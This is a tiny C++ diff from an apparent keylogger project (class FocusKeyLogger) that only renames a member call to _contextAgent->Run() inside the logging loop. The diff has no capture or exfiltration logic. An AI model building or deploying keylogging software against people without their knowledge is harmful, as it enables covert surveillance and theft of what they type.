@@ -15,7 +15,7 @@ void FocusKeyLogger::RunKeyLogger() {
 		PushKeyLog(newContext);
 	});
 
-	ContextAgent->Run(); //Block the current thread beacause msg loop windows (Remove after adding other components)
+	_contextAgent->Run(); //Block the current thread beacause msg loop windows (Remove after adding other components)
 }
 
 void FocusKeyLogger::PushKeyLog(std::string& context) {
